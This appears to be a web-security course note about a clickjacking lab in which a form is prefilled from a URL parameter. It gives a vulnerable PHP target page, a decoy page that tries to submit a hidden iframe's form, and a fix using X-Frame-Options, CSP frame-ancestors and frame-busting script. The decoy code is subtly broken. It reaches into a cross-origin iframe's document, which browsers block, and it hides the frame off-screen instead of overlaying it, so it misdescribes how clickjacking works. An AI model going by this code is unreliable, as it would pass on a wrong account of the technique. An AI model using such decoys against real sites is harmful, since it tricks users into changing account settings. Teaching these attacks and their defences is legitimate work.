---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Lab Setup: Clickjacking with Form Input Data Prefilled from a URL Parameter

In this lab, we will simulate a clickjacking attack where the attacker prepopulates a form input field using a URL parameter. The goal is to trick the user into updating their email address to one controlled by the attacker, allowing them to intercept password reset emails.

### Background Theory

Before diving into the lab setup, let's review some key concepts:

#### HTTP Requests and Responses

HTTP requests and responses are the backbone of web communication. Understanding these interactions is crucial for comprehending how clickjacking attacks work.

```http
POST /change-email HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

email=test@test.ca
```

The above request sends a POST request to the `/change-email` endpoint with the `email` parameter set to `test@test.ca`.

#### iFrames and CSS

iFrames allow embedding one HTML document within another. CSS can be used to manipulate the visibility and positioning of these iFrames.

```html
<iframe src="https://example.com/change-email?email=test@test.ca" style="position:absolute; left:-9999px;"></iframe>
```

This iFrame loads the target page with the email parameter prepopulated and positions it off-screen.

### Step-by-Step Mechanics

Let's walk through the steps involved in setting up and executing a clickjacking attack with form input data prefilled from a URL parameter.

#### Step 1: Create the Target Page

First, we need a target page that allows updating the email address via a form. Here’s an example of such a page:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Change Email</title>
</head>
<body>
    <h1>Change Your Email Address</h1>
    <form action="/change-email" method="post">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
```

This form prepopulates the email field based on the `email` parameter in the URL.

#### Step 2: Create the Decoy Page

Next, we create a decoy page that contains a hidden iFrame pointing to the target page with the email parameter prepopulated.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Click Me!</title>
</head>
<body>
    <h1>Click Me!</h1>
    <div style="position:relative;">
        <button onclick="document.getElementById('hiddenIframe').contentWindow.document.querySelector('button[type=submit]').click();">Click Me!</button>
        <iframe id="hiddenIframe" src="https://example.com/change-email?email=test@test.ca" style="position:absolute; left:-9999px;"></iframe>
    </div>
</body>
</html>
```

This decoy page includes a button that, when clicked, triggers the submission of the form in the hidden iFrame.

#### Step 3: User Interaction

When a user visits the decoy page and clicks the "Click Me!" button, they inadvertently submit the form in the hidden iFrame, updating their email address to `test@test.ca`.

### Complete Example

Here’s the complete example, including both the target page and the decoy page:

**Target Page (`change-email.php`):**

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    // Process the email update
    echo "Email updated to: $email";
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Change Email</title>
</head>
<body>
    <h1>Change Your Email Address</h1>
    <form action="/change-email" method="post">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
<?php
}
?>
```

**Decoy Page (`decoy.html`):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Click Me!</title>
</head>
<body>
    <h1>Click Me!</h1>
    <div style="position:relative;">
        <button onclick="document.getElementById('hiddenIframe').contentWindow.document.querySelector('button[type=submit]').click();">Click Me!</button>
        <iframe id="hiddenIframe" src="https://example.com/change-email?email=test@test.ca" style="position:absolute; left:-9999px;"></iframe>
    </div>
</body>
</html>
```

### Pitfalls and Common Mistakes

1. **Improper Validation**: Ensure that the email address is properly validated and sanitized to prevent injection attacks.
2. **Missing CSRF Tokens**: Always use CSRF tokens to protect against cross-site request forgery attacks.
3. **Inadequate Logging**: Implement logging to track suspicious activities and detect potential clickjacking attempts.

### Detection and Prevention

#### How to Detect Clickjacking Attacks

1. **Network Monitoring**: Monitor network traffic for unusual patterns, such as unexpected form submissions.
2. **Logging**: Implement detailed logging of user actions, especially those involving sensitive operations.
3. **Security Tools**: Use security tools like Burp Suite or ZAP to detect and analyze potential clickjacking vulnerabilities.

#### How to Prevent Clickjacking Attacks

1. **X-Frame-Options Header**: Set the `X-Frame-Options` header to `SAMEORIGIN` or `DENY` to prevent the page from being loaded in an iFrame.
   
   ```http
   X-Frame-Options: SAMEORIGIN
   ```

2. **Content Security Policy (CSP)**: Implement a Content Security Policy that restricts the sources from which content can be loaded.

   ```http
   Content-Security-Policy: frame-ancestors 'self'
   ```

3. **JavaScript Mitigation**: Use JavaScript to detect and prevent the page from being loaded in an iFrame.

   ```javascript
   if (window.self !== window.top) {
       window.top.location = window.self.location;
   }
   ```

#### Secure Code Fix

Here’s how to implement the secure code fix:

**Vulnerable Code:**

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    // Process the email update
    echo "Email updated to: $email";
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Change Email</title>
</head>
<body>
    <h1>Change Your Email Address</h1>
    <form action="/change-email" method="post">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
<?php
}
?>
```

**Secure Code:**

```php
<?php
header("X-Frame-Options: SAMEORIGIN");
header("Content-Security-Policy: frame-ancestors 'self'");
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    // Process the email update
    echo "Email updated to: $email";
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Change Email</title>
    <script>
        if (window.self !== window.top) {
            window.top.location = window.self.location;
        }
    </script>
</head>
<body>
    <h1>Change Your Email Address</h1>
    <form action="/change-email" method="post">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
<?php
}
?>
```

### Hands-On Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on various web security topics, including clickjacking.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

These labs provide practical experience in identifying and mitigating clickjacking vulnerabilities.

### Conclusion

Clickjacking is a sophisticated attack vector that can lead to significant security breaches if not properly defended against. By understanding the mechanics of clickjacking, implementing robust defenses, and regularly testing for vulnerabilities, organizations can significantly reduce the risk of such attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/05-Clickjacking/03-Lab 2 Clickjacking with form input data prefilled from a URL parameter/01-Introduction to Clickjacking|Introduction to Clickjacking]] | [[Web Security (PortSwigger)/05-Clickjacking/03-Lab 2 Clickjacking with form input data prefilled from a URL parameter/00-Overview|Overview]] | [[Web Security (PortSwigger)/05-Clickjacking/03-Lab 2 Clickjacking with form input data prefilled from a URL parameter/03-Practice Questions & Answers|Practice Questions & Answers]]
